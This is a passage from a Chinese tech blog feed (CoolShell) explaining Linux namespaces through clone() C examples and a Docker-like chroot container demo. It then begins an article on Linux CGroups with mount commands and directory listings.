<td><a href="https://lwn.net/Articles/187274/" target="_blank" rel="noopener noreferrer">Linux 2.6.19</a></td>
</tr>
<tr>
<td><b>PID namespaces</b></td>
<td>CLONE_NEWPID</td>
<td><a href="https://lwn.net/Articles/259217/" target="_blank" rel="noopener noreferrer">Linux 2.6.24</a></td>
</tr>
<tr>
<td><b>Network namespaces</b></td>
<td>CLONE_NEWNET</td>
<td><a href="https://lwn.net/Articles/219794/" target="_blank" rel="noopener noreferrer">始于Linux 2.6.24 完成于 Linux 2.6.29</a></td>
</tr>
<tr>
<td><b>User namespaces</b></td>
<td>CLONE_NEWUSER</td>
<td><a href="https://lwn.net/Articles/528078/" target="_blank" rel="noopener noreferrer">始于 Linux 2.6.23 完成于 Linux 3.8)</a></td>
</tr>
</tbody>
</table>
<p>主要是三个系统调用</p>
<ul>
<li>
<b><code>clone</code></b><b>() </b>– 实现线程的系统调用，用来创建一个新的进程，并可以通过设计上述参数达到隔离。</li>
<li>
<b><code>unshare</code></b><b>() </b>– 使某进程脱离某个namespace</li>
<li>
<b><code>setns</code></b><b>() </b>– 把某进程加入到某个namespace</li>
</ul>
<p>unshare() 和 setns() 都比较简单，大家可以自己man，我这里不说了。</p>
<p>下面还是让我们来看一些示例（以下的测试程序最好在Linux 内核为3.8以上的版本中运行，我用的是ubuntu 14.04）。</p>
<h4>
<span class="ez-toc-section" id="clone%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"></span>clone()系统调用<span class="ez-toc-section-end"></span>
</h4>
<p>首先，我们来看一下一个最简单的clone()系统调用的示例，（后面，我们的程序都会基于这个程序做修改）：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">#define _GNU_SOURCE
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sched.h&gt;
#include &lt;signal.h&gt;
#include &lt;unistd.h&gt;

/* 定义一个给 clone 用的栈，栈大小1M */
#define STACK_SIZE (1024 * 1024)
static char container_stack[STACK_SIZE];

char* const container_args[] = {
    "/bin/bash",
    NULL
};

int container_main(void* arg)
{
    printf("Container - inside the container!\n");
    /* 直接执行一个shell，以便我们观察这个进程空间里的资源是否被隔离了 */
    execv(container_args[0], container_args); 
    printf("Something's wrong!\n");
    return 1;
}

int main()
{
    printf("Parent - start a container!\n");
    /* 调用clone函数，其中传出一个函数，还有一个栈空间的（为什么传尾指针，因为栈是反着的） */
    int container_pid = clone(container_main, container_stack+STACK_SIZE, SIGCHLD, NULL);
    /* 等待子进程结束 */
    waitpid(container_pid, NULL, 0);
    printf("Parent - container stopped!\n");
    return 0;
}</pre>
<p>从上面的程序，我们可以看到，这和pthread基本上是一样的玩法。但是，对于上面的程序，父子进程的进程空间是没有什么差别的，父进程能访问到的子进程也能。</p>
<p>下面， 让我们来看几个例子看看，Linux的Namespace是什么样的。</p>
<h4>
<span class="ez-toc-section" id="UTS_Namespace"></span>UTS Namespace<span class="ez-toc-section-end"></span>
</h4>
<p>下面的代码，我略去了上面那些头文件和数据结构的定义，只有最重要的部分。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c" data-enlighter-highlight="4,14">int container_main(void* arg)
{
    printf("Container - inside the container!\n");
    sethostname("container",10); /* 设置hostname */
    execv(container_args[0], container_args);
    printf("Something's wrong!\n");
    return 1;
}

int main()
{
    printf("Parent - start a container!\n");
    int container_pid = clone(container_main, container_stack+STACK_SIZE, 
            CLONE_NEWUTS | SIGCHLD, NULL); /*启用CLONE_NEWUTS Namespace隔离 */
    waitpid(container_pid, NULL, 0);
    printf("Parent - container stopped!\n");
    return 0;
}</pre>
<pre>运行上面的程序你会发现（需要root权限），子进程的hostname变成了 container。</pre>
<pre class="EnlighterJSRAW" data-enlighter-language="shell"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b1d9d2d9d4dff1c4d3c4dfc5c4">[email protected]</a>:~$ sudo ./uts
Parent - start a container!
Container - inside the container!
<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="67150808132704080913060e090215">[email protected]</a>:~# hostname
container
<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="ea9885859eaa8985849e8b83848f98">[email protected]</a>:~# uname -n
container</pre>
<h4>
<span class="ez-toc-section" id="IPC_Namespace"></span>IPC Namespace<span class="ez-toc-section-end"></span>
</h4>
<p>IPC全称 Inter-Process Communication，是Unix/Linux下进程间通信的一种方式，IPC有共享内存、信号量、消息队列等方法。所以，为了隔离，我们也需要把IPC给隔离开来，这样，只有在同一个Namespace下的进程才能相互通信。如果你熟悉IPC的原理的话，你会知道，IPC需要有一个全局的ID，即然是全局的，那么就意味着我们的Namespace需要对这个ID隔离，不能让别的Namespace的进程看到。</p>
<p>要启动IPC隔离，我们只需要在调用clone时加上CLONE_NEWIPC参数就可以了。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">int container_pid = clone(container_main, container_stack+STACK_SIZE, 
            CLONE_NEWUTS | CLONE_NEWIPC | SIGCHLD, NULL);</pre>
<p>首先，我们先创建一个IPC的Queue（如下所示，全局的Queue ID是0）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="1d757e7578735d687f68736968">[email protected]</a>:~$ ipcmk -Q 
Message queue id: 0

<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="422a212a272c023720372c3637">[email protected]</a>:~$ ipcs -q
------ Message Queues --------
key        msqid      owner      perms      used-bytes   messages    
0xd0d56eb2 0          hchen      644        0            0</pre>
<p>如果我们运行没有CLONE_NEWIPC的程序，我们会看到，在子进程中还是能看到这个全启的IPC Queue。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7a1219121f143a0f180f140e0f">[email protected]</a>:~$ sudo ./uts 
Parent - start a container!
Container - inside the container!

<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="71031e1e0531121e1f0510181f1403">[email protected]</a>:~# ipcs -q

------ Message Queues --------
key        msqid      owner      perms      used-bytes   messages    
0xd0d56eb2 0          hchen      644        0            0</pre>
<p>但是，如果我们运行加上了CLONE_NEWIPC的程序，我们就会下面的结果：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="dfadb0b0ab9faabdaab1abaa">[email protected]</a>:~$ sudo./ipc
Parent - start a container!
Container - inside the container!

<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="27554848536744484953464e494255">[email protected]</a>:~/linux_namespace# ipcs -q

------ Message Queues --------
key        msqid      owner      perms      used-bytes   messages</pre>
<p>我们可以看到IPC已经被隔离了。</p>
<h4>
<span class="ez-toc-section" id="PID_Namespace"></span>PID Namespace<span class="ez-toc-section-end"></span>
</h4>
<p>我们继续修改上面的程序：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c" data-enlighter-highlight="4,16">int container_main(void* arg)
{
    /* 查看子进程的PID，我们可以看到其输出子进程的 pid 为 1 */
    printf("Container [%5d] - inside the container!\n", getpid());
    sethostname("container",10);
    execv(container_args[0], container_args);
    printf("Something's wrong!\n");
    return 1;
}

int main()
{
    printf("Parent [%5d] - start a container!\n", getpid());
    /*启用PID namespace - CLONE_NEWPID*/
    int container_pid = clone(container_main, container_stack+STACK_SIZE, 
            CLONE_NEWUTS | CLONE_NEWPID | SIGCHLD, NULL); 
    waitpid(container_pid, NULL, 0);
    printf("Parent - container stopped!\n");
    return 0;
}</pre>
<p>运行结果如下（我们可以看到，子进程的pid是1了）：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="50383338353e102532253e2425">[email protected]</a>:~$ sudo ./pid
Parent [ 3474] - start a container!
Container [ 1] - inside the container!
<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="daa8b5b5ae9ab9b5b4aebbb3b4bfa8">[email protected]</a>:~# echo $$
1</pre>
<p>你可能会问，PID为1有个毛用啊？我们知道，在传统的UNIX系统中，PID为1的进程是init，地位非常特殊。他作为所有进程的父进程，有很多特权（比如：屏蔽信号等），另外，其还会为检查所有进程的状态，我们知道，如果某个子进程脱离了父进程（父进程没有wait它），那么init就会负责回收资源并结束这个子进程。所以，要做到进程空间的隔离，首先要创建出PID为1的进程，最好就像chroot那样，把子进程的PID在容器内变成1。</p>
<p><strong>但是，我们会发现，在子进程的shell里输入ps,top等命令，我们还是可以看得到所有进程</strong>。说明并没有完全隔离。这是因为，像ps, top这些命令会去读/proc文件系统，所以，因为/proc文件系统在父进程和子进程都是一样的，所以这些命令显示的东西都是一样的。</p>
<p>所以，我们还需要对文件系统进行隔离。</p>
<h4>
<span class="ez-toc-section" id="Mount_Namespace"></span>Mount Namespace<span class="ez-toc-section-end"></span>
</h4>
<p>下面的例程中，我们在启用了mount namespace并在子进程中重新mount了/proc文件系统。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c" data-enlighter-highlight="6,17">int container_main(void* arg)
{
    printf("Container [%5d] - inside the container!\n", getpid());
    sethostname("container",10);
    /* 重新mount proc文件系统到 /proc下 */
    system("mount -t proc proc /proc");
    execv(container_args[0], container_args);
    printf("Something's wrong!\n");
    return 1;
}

int main()
{
    printf("Parent [%5d] - start a container!\n", getpid());
    /* 启用Mount Namespace - 增加CLONE_NEWNS参数 */
    int container_pid = clone(container_main, container_stack+STACK_SIZE, 
            CLONE_NEWUTS | CLONE_NEWPID | CLONE_NEWNS | SIGCHLD, NULL);
    waitpid(container_pid, NULL, 0);
    printf("Parent - container stopped!\n");
    return 0;
}</pre>
<p>运行结果如下：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="80e8e3e8e5eec0f5e2f5eef4f5">[email protected]</a>:~$ sudo ./pid.mnt
Parent [ 3502] - start a container!
Container [    1] - inside the container!
<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0d7f6262794d6e6263796c6463687f">[email protected]</a>:~# ps -elf 
F S UID        PID  PPID  C PRI  NI ADDR SZ WCHAN  STIME TTY          TIME CMD
4 S root         1     0  0  80   0 -  6917 wait   19:55 pts/2    00:00:00 /bin/bash
0 R root        14     1  0  80   0 -  5671 -      19:56 pts/2    00:00:00 ps -elf
</pre>
<p>上面，我们可以看到只有两个进程 ，而且pid=1的进程是我们的/bin/bash。我们还可以看到/proc目录下也干净了很多：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="9ae8f5f5eedaf9f5f4eefbf3f4ffe8">[email protected]</a>:~# ls /proc
1          dma          key-users   net            sysvipc
16         driver       kmsg        pagetypeinfo   timer_list
acpi       execdomains  kpagecount  partitions     timer_stats
asound     fb           kpageflags  sched_debug    tty
buddyinfo  filesystems  loadavg     schedstat      uptime
bus        fs           locks       scsi           version
cgroups    interrupts   mdstat      self           version_signature
cmdline    iomem        meminfo     slabinfo       vmallocinfo
consoles   ioports      misc        softirqs       vmstat
cpuinfo    irq          modules     stat           zoneinfo
crypto     kallsyms     mounts      swaps
devices    kcore        mpt         sys
diskstats  keys         mtrr        sysrq-trigger
</pre>
<p>下图，我们也可以看到在子进程中的top命令只看得到两个进程了。</p>
<p><img alt="image placeholder" ></p>
<p>这里，多说一下。在通过CLONE_NEWNS创建mount namespace后，父进程会把自己的文件结构复制给子进程中。而子进程中新的namespace中的所有mount操作都只影响自身的文件系统，而不对外界产生任何影响。这样可以做到比较严格地隔离。</p>
<p></p>
<p>你可能会问，我们是不是还有别的一些文件系统也需要这样mount? 是的。</p>
<h4>
<span class="ez-toc-section" id="Docker%E7%9A%84_Mount_Namespace"></span>Docker的 Mount Namespace<span class="ez-toc-section-end"></span>
</h4>
<p>下面我将向演示一个“山寨镜像”，其模仿了Docker的Mount Namespace。</p>
<p>首先，我们需要一个rootfs，也就是我们需要把我们要做的镜像中的那些命令什么的copy到一个rootfs的目录下，我们模仿Linux构建如下的目录：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="ff979c979a91bf8a9d8a918b8a">[email protected]</a>:~/rootfs$ ls
bin  dev  etc  home  lib  lib64  mnt  opt  proc  root  run  sbin  sys  tmp  usr  var</pre>
<p>然后，我们把一些我们需要的命令copy到 rootfs/bin目录中（sh命令必需要copy进去，不然我们无法 chroot ）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="92faf1faf7fcd2e7f0e7fce6e7">[email protected]</a>:~/rootfs$ ls ./bin ./usr/bin
 
./bin:
bash   chown  gzip      less  mount       netstat  rm     tabs  tee      top       tty
cat    cp     hostname  ln    mountpoint  ping     sed    tac   test     touch     umount
chgrp  echo   ip        ls    mv          ps       sh     tail  timeout  tr        uname
chmod  grep   kill      more  nc          pwd      sleep  tar   toe      truncate  which

./usr/bin:
awk  env  groups  head  id  mesg  sort  strace  tail  top  uniq  vi  wc  xargs
</pre>
<p>注：你可以使用ldd命令把这些命令相关的那些so文件copy到对应的目录：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="8de5eee5e8e3cdf8eff8e3f9f8">[email protected]</a>:~/rootfs/bin$ ldd bash
  linux-vdso.so.1 =&gt;  (0x00007fffd33fc000)
  libtinfo.so.5 =&gt; /lib/x86_64-linux-gnu/libtinfo.so.5 (0x00007f4bd42c2000)
  libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4bd40be000)
  libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4bd3cf8000)
  /lib64/ld-linux-x86-64.so.2 (0x00007f4bd4504000)
</pre>
<p>下面是我的rootfs中的一些so文件：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="acc4cfc4c9c2ecd9ced9c2d8d9">[email protected]</a>:~/rootfs$ ls ./lib64 ./lib/x86_64-linux-gnu/

./lib64:
ld-linux-x86-64.so.2

./lib/x86_64-linux-gnu/:
libacl.so.1      libmemusage.so         libnss_files-2.19.so    libpython3.4m.so.1
libacl.so.1.1.0  libmount.so.1          libnss_files.so.2       libpython3.4m.so.1.0
libattr.so.1     libmount.so.1.1.0      libnss_hesiod-2.19.so   libresolv-2.19.so
libblkid.so.1    libm.so.6              libnss_hesiod.so.2      libresolv.so.2
libc-2.19.so     libncurses.so.5        libnss_nis-2.19.so      libselinux.so.1
libcap.a         libncurses.so.5.9      libnss_nisplus-2.19.so  libtinfo.so.5
libcap.so        libncursesw.so.5       libnss_nisplus.so.2     libtinfo.so.5.9
libcap.so.2      libncursesw.so.5.9     libnss_nis.so.2         libutil-2.19.so
libcap.so.2.24   libnsl-2.19.so         libpcre.so.3            libutil.so.1
libc.so.6        libnsl.so.1            libprocps.so.3          libuuid.so.1
libdl-2.19.so    libnss_compat-2.19.so  libpthread-2.19.so      libz.so.1
libdl.so.2       libnss_compat.so.2     libpthread.so.0
libgpm.so.2      libnss_dns-2.19.so     libpython2.7.so.1
libm-2.19.so     libnss_dns.so.2        libpython2.7.so.1.0
</pre>
<p>包括这些命令依赖的一些配置文件：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="ee868d868b80ae9b8c9b809a9b">[email protected]</a>:~/rootfs$ ls ./etc
bash.bashrc  group  hostname  hosts  ld.so.cache  nsswitch.conf  passwd  profile  
resolv.conf  shadow
</pre>
<p>你现在会说，我靠，有些配置我希望是在容器起动时给他设置的，而不是hard code在镜像中的。比如：/etc/hosts，/etc/hostname，还有DNS的/etc/resolv.conf文件。好的。那我们在rootfs外面，我们再创建一个conf目录，把这些文件放到这个目录中。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2f474c474a416f5a4d5a415b5a">[email protected]</a>:~$ ls ./conf
hostname     hosts     resolv.conf</pre>
<p>这样，我们的父进程就可以动态地设置容器需要的这些文件的配置， 然后再把他们mount进容器，这样，容器的镜像中的配置就比较灵活了。</p>
<p>好了，终于到了我们的程序。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">#define _GNU_SOURCE
#include <sys types.h>
#include <sys wait.h>
#include <sys mount.h>
#include <stdio.h>
#include <sched.h>
#include <signal.h>
#include <unistd.h>

#define STACK_SIZE (1024 * 1024)

static char container_stack[STACK_SIZE];
char* const container_args[] = {
    "/bin/bash",
    "-l",
    NULL
};

int container_main(void* arg)
{
    printf("Container [%5d] - inside the container!\n", getpid());

    //set hostname
    sethostname("container",10);

    //remount "/proc" to make sure the "top" and "ps" show container's information
    if (mount("proc", "rootfs/proc", "proc", 0, NULL) !=0 ) {
        perror("proc");
    }
    if (mount("sysfs", "rootfs/sys", "sysfs", 0, NULL)!=0) {
        perror("sys");
    }
    if (mount("none", "rootfs/tmp", "tmpfs", 0, NULL)!=0) {
        perror("tmp");
    }
    if (mount("udev", "rootfs/dev", "devtmpfs", 0, NULL)!=0) {
        perror("dev");
    }
    if (mount("devpts", "rootfs/dev/pts", "devpts", 0, NULL)!=0) {
        perror("dev/pts");
    }
    if (mount("shm", "rootfs/dev/shm", "tmpfs", 0, NULL)!=0) {
        perror("dev/shm");
    }
    if (mount("tmpfs", "rootfs/run", "tmpfs", 0, NULL)!=0) {
        perror("run");
    }
    /* 
     * 模仿Docker的从外向容器里mount相关的配置文件 
     * 你可以查看：/var/lib/docker/containers/<container_id>/目录，
     * 你会看到docker的这些文件的。
     */
    if (mount("conf/hosts", "rootfs/etc/hosts", "none", MS_BIND, NULL)!=0 ||
          mount("conf/hostname", "rootfs/etc/hostname", "none", MS_BIND, NULL)!=0 ||
          mount("conf/resolv.conf", "rootfs/etc/resolv.conf", "none", MS_BIND, NULL)!=0 ) {
        perror("conf");
    }
    /* 模仿docker run命令中的 -v, --volume=[] 参数干的事 */
    if (mount("/tmp/t1", "rootfs/mnt", "none", MS_BIND, NULL)!=0) {
        perror("mnt");
    }

    /* chroot 隔离目录 */
    if ( chdir("./rootfs") != 0 || chroot("./") != 0 ){
        perror("chdir/chroot");
    }

    execv(container_args[0], container_args);
    perror("exec");
    printf("Something's wrong!\n");
    return 1;
}

int main()
{
    printf("Parent [%5d] - start a container!\n", getpid());
    int container_pid = clone(container_main, container_stack+STACK_SIZE, 
            CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWPID | CLONE_NEWNS | SIGCHLD, NULL);
    waitpid(container_pid, NULL, 0);
    printf("Parent - container stopped!\n");
    return 0;
}
</container_id></unistd.h></signal.h></sched.h></stdio.h></sys></sys></sys></pre>
<p>sudo运行上面的程序，你会看到下面的挂载信息以及一个所谓的“镜像”：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="85ede6ede0ebc5f0e7f0ebf1f0">[email protected]</a>:~$ sudo ./mount 
Parent [ 4517] - start a container!
Container [    1] - inside the container!
<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0b7964647f4b6864657f6a62656e79">[email protected]</a>:/# mount
proc on /proc type proc (rw,relatime)
sysfs on /sys type sysfs (rw,relatime)
none on /tmp type tmpfs (rw,relatime)
udev on /dev type devtmpfs (rw,relatime,size=493976k,nr_inodes=123494,mode=755)
devpts on /dev/pts type devpts (rw,relatime,mode=600,ptmxmode=000)
tmpfs on /run type tmpfs (rw,relatime)
/dev/disk/by-uuid/18086e3b-d805-4515-9e91-7efb2fe5c0e2 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/disk/by-uuid/18086e3b-d805-4515-9e91-7efb2fe5c0e2 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/disk/by-uuid/18086e3b-d805-4515-9e91-7efb2fe5c0e2 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro,data=ordered)

<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="394b56564d795a56574d5850575c4b">[email protected]</a>:/# ls /bin /usr/bin
/bin:
bash   chmod  echo  hostname  less  more  mv   ping  rm   sleep  tail  test    top   truncate  uname
cat    chown  grep  ip        ln    mount  nc   ps    sed  tabs   tar   timeout  touch  tty     which
chgrp  cp     gzip  kill      ls    mountpoint  netstat  pwd   sh   tac    tee   toe    tr   umount

/usr/bin:
awk  env  groups  head  id  mesg  sort  strace  tail  top  uniq  vi  wc  xargs
</pre>
<p>关于如何做一个chroot的目录，这里有个工具叫<a href="https://wiki.ubuntu.com/DebootstrapChroot" target="_blank" rel="noopener noreferrer">DebootstrapChroot</a>，你可以顺着链接去看看（英文的哦）</p>
<p>接下来的事情，你可以自己玩了，我相信你的想像力 。：）</p>
<p>在下一篇，我将向你介绍User Namespace、Network Namespace以及Namespace的其它东西。</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2015-04-16T10:20:08+08:00</pubDate>
<guid>https://coolshell.cn/articles/17010.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Docker基础技术：Linux CGroup ]]></title>
<link>https://coolshell.cn/articles/17049.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >前面，我们介绍了<a title="Docker基础技术：Linux Namespace" href="https://coolshell.cn/articles/17010.html" target="_blank">Linux Namespace</a>，但是Namespace解决的问题主要是环境隔离的问题，这只是虚拟化中最最基础的一步，我们还需要解决对计算机资源使用上的隔离。也就是说，虽然你通过Namespace把我Jail到一个特定的环境中去了，但是我在其中的进程使用用CPU、内存、磁盘等这些计算资源其实还是可以随心所欲的。所以，我们希望对进程进行资源利用上的限制或控制。这就是Linux CGroup出来了的原因。</p>
<p>Linux CGroup全称Linux Control Group， 是Linux内核的一个功能，用来限制，控制与分离一个进程组群的资源（如CPU、内存、磁盘输入输出等）。这个项目最早是由Google的工程师在2006年发起（主要是Paul Menage和Rohit Seth），最早的名称为进程容器（process containers）。在2007年时，因为在Linux内核中，容器（container）这个名词太过广泛，为避免混乱，被重命名为cgroup，并且被合并到2.6.24版的内核中去。然后，其它开始了他的发展。</p>
<p>Linux CGroupCgroup 可​​​让​​​您​​​为​​​系​​​统​​​中​​​所​​​运​​​行​​​任​​​务​​​（进​​​程​​​）的​​​用​​​户​​​定​​​义​​​组​​​群​​​分​​​配​​​资​​​源​​​ — 比​​​如​​​ CPU 时​​​间​​​、​​​系​​​统​​​内​​​存​​​、​​​网​​​络​​​带​​​宽​​​或​​​者​​​这​​​些​​​资​​​源​​​的​​​组​​​合​​​。​​​您​​​可​​​以​​​监​​​控​​​您​​​配​​​置​​​的​​​ cgroup，拒​​​绝​​​ cgroup 访​​​问​​​某​​​些​​​资​​​源​​​，甚​​​至​​​在​​​运​​​行​​​的​​​系​​​统​​​中​​​动​​​态​​​配​​​置​​​您​​​的​​​ cgroup。</p>
<p>主要提供了如下功能：</p>
<p><span id="more-17049"></span></p>
<ul>
<li>
<strong>Resource limitation</strong>: 限制资源使用，比如内存使用上限以及文件系统的缓存限制。</li>
<li>
<strong>Prioritization</strong>: 优先级控制，比如：CPU利用和磁盘IO吞吐。</li>
<li>
<strong>Accounting</strong>: 一些审计或一些统计，主要目的是为了计费。</li>
<li>
<strong>Control</strong>: 挂起进程，恢复执行进程。</li>
</ul>
<p>使​​​用​​​ cgroup，系​​​统​​​管​​​理​​​员​​​可​​​更​​​具​​​体​​​地​​​控​​​制​​​对​​​系​​​统​​​资​​​源​​​的​​​分​​​配​​​、​​​优​​​先​​​顺​​​序​​​、​​​拒​​​绝​​​、​​​管​​​理​​​和​​​监​​​控​​​。​​​可​​​更​​​好​​​地​​​根​​​据​​​任​​​务​​​和​​​用​​​户​​​分​​​配​​​硬​​​件​​​资​​​源​​​，提​​​高​​​总​​​体​​​效​​​率​​​。</p>
<p>在实践中，系统管理员一般会利用CGroup做下面这些事（有点像为某个虚拟机分配资源似的）：</p>
<ul>
<li>隔离一个进程集合（比如：nginx的所有进程），并限制他们所消费的资源，比如绑定CPU的核。</li>
<li>为这组进程 分配其足够使用的内存</li>
<li>为这组进程分配相应的网络带宽和磁盘存储限制</li>
<li>限制访问某些设备（通过设置设备的白名单）</li>
</ul>
<p>那么CGroup是怎么干的呢？我们先来点感性认识吧。</p>
<p>首先，Linux把CGroup这个事实现成了一个file system，你可以mount。在我的Ubuntu 14.04下，你输入以下命令你就可以看到cgroup已为你mount好了。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="573f343f323917223522392322">[email protected]</a>:~$ mount -t cgroup
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,relatime,cpuset)
cgroup on /sys/fs/cgroup/cpu type cgroup (rw,relatime,cpu)
cgroup on /sys/fs/cgroup/cpuacct type cgroup (rw,relatime,cpuacct)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,relatime,memory)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,relatime,devices)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,relatime,freezer)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,relatime,blkio)
cgroup on /sys/fs/cgroup/net_prio type cgroup (rw,net_prio)
cgroup on /sys/fs/cgroup/net_cls type cgroup (rw,net_cls)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,relatime,perf_event)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,relatime,hugetlb)</pre>
<p>或者使用lssubsys命令：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ lssubsys  -m
cpuset /sys/fs/cgroup/cpuset
cpu /sys/fs/cgroup/cpu
cpuacct /sys/fs/cgroup/cpuacct
memory /sys/fs/cgroup/memory
devices /sys/fs/cgroup/devices
freezer /sys/fs/cgroup/freezer
blkio /sys/fs/cgroup/blkio
net_cls /sys/fs/cgroup/net_cls
net_prio /sys/fs/cgroup/net_prio
perf_event /sys/fs/cgroup/perf_event
hugetlb /sys/fs/cgroup/hugetlb</pre>
<p>我们可以看到，在/sys/fs下有一个cgroup的目录，这个目录下还有很多子目录，比如： cpu，cpuset，memory，blkio……这些，这些都是cgroup的子系统。分别用于干不同的事的。</p>
<p>如果你没有看到上述的目录，你可以自己mount，下面给了一个示例：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">mkdir cgroup
mount -t tmpfs cgroup_root ./cgroup
mkdir cgroup/cpuset
mount -t cgroup -ocpuset cpuset ./cgroup/cpuset/
mkdir cgroup/cpu
mount -t cgroup -ocpu cpu ./cgroup/cpu/
mkdir cgroup/memory
mount -t cgroup -omemory memory ./cgroup/memory/</pre>
<p>一旦mount成功，你就会看到这些目录下就有好文件了，比如，如下所示的cpu和cpuset的子系统：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5c343f3439321c293e29322829">[email protected]</a>:~$ ls /sys/fs/cgroup/cpu /sys/fs/cgroup/cpuset/ 
/sys/fs/cgroup/cpu:
cgroup.clone_children  cgroup.sane_behavior  cpu.shares         release_agent
cgroup.event_control   cpu.cfs_period_us     cpu.stat           tasks
cgroup.procs           cpu.cfs_quota_us      notify_on_release  user

/sys/fs/cgroup/cpuset/:
cgroup.clone_children  cpuset.mem_hardwall             cpuset.sched_load_balance
cgroup.event_control   cpuset.memory_migrate           cpuset.sched_relax_domain_level
cgroup.procs           cpuset.memory_pressure          notify_on_release
cgroup.sane_behavior   cpuset.memory_pressure_enabled  release_agent
cpuset.cpu_exclusive   cpuset.memory_spread_page       tasks
cpuset.cpus            cpuset.memory_spread_slab       user
cpuset.mem_exclusive   cpuset.mems</pre>
<p>你可以到/sys/fs/cgroup的各个子目录下去make个dir，你会发现，一旦你创建了一个子目录，这个子目录里又有很多文件了。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="1a7279727f745a6f786f746e6f">[email protected]</a>:/sys/fs/cgroup/cpu$ sudo mkdir haoel
[sudo] password for hchen: 
<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="741c171c111a340116011a0001">[email protected]</a>:/sys/fs/cgroup/cpu$ ls ./haoel
cgroup.clone_children  cgroup.procs       cpu.cfs_quota_us  cpu.stat           tasks
cgroup.event_control   cpu.cfs_period_us  cpu.shares        notify_on_release</pre>
<p>好了，我们来看几个示例。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#CPU_%E9%99%90%E5%88%B6" title="CPU 限制">CPU 限制</a></li>
